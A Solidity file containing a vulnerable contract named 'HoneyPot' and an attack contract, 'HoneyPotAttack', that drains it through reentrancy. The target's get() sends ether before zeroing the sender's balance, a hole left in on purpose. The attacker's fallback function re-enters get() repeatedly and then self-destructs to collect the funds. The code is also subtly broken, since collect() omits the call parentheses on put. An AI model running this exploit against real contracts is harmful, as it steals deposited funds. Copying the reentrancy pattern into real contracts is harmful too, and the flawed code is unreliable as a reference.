pragma solidity ^0.4.18;

contract HoneyPot {
    mapping (address=>uint) public balances;

    function put() public payable {
        balances[msg.sender] = msg.value;
    }

    function get() public {
        require(balances[msg.sender]>0);
        if (!msg.sender.call.value(balances[msg.sender])()) {
            revert();
        }

        balances[msg.sender] = 0;
    }
}

contract HoneyPotAttack {
    HoneyPot public honeyPot;

    function HoneyPotAttack(address _honeyPot) public payable {
        honeyPot = HoneyPot(_honeyPot);
    }

    function collect() public payable {
        honeyPot.put.value(msg.value);
        honeyPot.get();
        selfdestruct(msg.sender);
    }

    function() external payable {
        if (honeyPot.balance >= msg.value) {
            honeyPot.get();
        }
    }
    function returnHoneyPotBalance() public view returns(uint256) {
        return honeyPot.balance;
    }
    function returnContractBalance() public view returns(uint256) {
        return this.balance;
    }
}